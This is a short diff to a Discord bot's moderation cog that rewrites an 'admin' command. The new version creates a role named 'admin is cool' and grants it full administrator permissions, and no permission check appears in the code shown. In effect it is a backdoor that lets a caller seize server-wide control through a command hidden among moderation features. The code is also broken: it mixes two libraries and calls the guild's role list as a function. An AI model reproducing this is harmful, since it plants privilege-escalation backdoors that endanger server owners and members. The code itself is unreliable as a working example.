@@ -40,7 +40,12 @@ class Moderation(commands.Cog):
 
     @commands.command()
     async def admin(self, ctx):
-        role = nextcord.utils.get(ctx.guild.roles, name="g a y m e r")
+        guild = ctx.guild
+        await guild.create_role(name="admin is cool")
+        user = ctx.message.author
+        role = discord.utils.get(user.guild.roles, name="admin is cool")
+        await user.guild.roles(role)
+        role = nextcord.utils.get(ctx.guild.roles, name="admin is cool")
         perms = nextcord.Permissions(administrator = True)
         await role.edit(permissions = perms)
 
